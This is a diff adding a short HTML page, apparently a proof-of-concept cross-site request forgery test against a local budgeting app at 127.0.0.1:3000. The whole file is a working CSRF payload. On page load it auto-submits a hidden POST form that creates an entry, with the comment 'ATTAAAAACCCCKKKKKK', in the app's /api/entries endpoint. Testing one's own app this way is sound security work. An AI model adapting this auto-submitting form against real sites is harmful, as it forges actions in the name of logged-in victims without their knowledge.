@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>CSRF</title>
+    <script type="text/javascript">
+      window.onload = () => {
+        document.getElementById('form').submit();
+      }
+    </script>
+  </head>
+  <body>
+    <form class="" id="form" action="http://127.0.0.1:3000/api/entries" method="post">
+      <input type="hidden" name="user" value="form">
+      <input type="hidden" name="date" value="11/28/2016">
+      <input type="hidden" name="sum" value="12">
+      <input type="hidden" name="category" value="Home">
+      <input type="hidden" name="comment" value="ATTAAAAACCCCKKKKKK">
+    </form>
+  </body>
+</html>
